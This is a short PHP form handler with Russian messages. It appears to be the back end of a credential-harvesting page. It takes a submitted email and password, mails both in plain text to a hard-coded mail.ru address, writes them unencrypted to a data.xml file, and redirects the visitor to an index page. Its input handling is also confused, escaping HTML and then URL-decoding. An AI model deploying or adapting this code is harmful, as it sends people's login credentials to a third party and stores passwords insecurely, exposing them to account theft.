<?php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $password = $_POST['password'];
    $email = $_POST['email'];
    $password_confirm = $_POST['password_confirm'];

    $password = htmlspecialchars($password);
    $email = htmlspecialchars($email);
    $password_confirm = htmlspecialchars($password_confirm);

    $password = urldecode($password);
    $email = urldecode($email);
    $password_confirm = urldecode($password_confirm);

    $password = trim($password);
    $email = trim($email);
    $password_confirm = trim($password_confirm);

    if (mail("t.dinar.s@mail.ru",
        "Новое письмо с сайта",
        "Пароль: ".$password."\n".
        "Email: ".$email."\n".
        "Подтверждение пароля: ".$password_confirm,
        "From: no-reply@mydomain.ru \r\n")
    ) {
        $xmlFile = 'data.xml';

        if (file_exists($xmlFile)) {
            $xml = simplexml_load_file($xmlFile);

            $item = $xml->addChild('item');
            $item->addChild('email', $email);
            $item->addChild('password', $password);

            $xml->asXML($xmlFile);
        } else {
            $xml = new SimpleXMLElement('<data/>');
            $item = $xml->addChild('item');
            $item->addChild('email', $email);
            $item->addChild('password', $password);
            $xml->asXML($xmlFile);
        }

        header("Location: ../index.html");
        exit;
    } else {
        echo ('Есть ошибки! Проверьте данные...');
    }
} else {
    echo 'Неверный метод запроса!';
}
?>
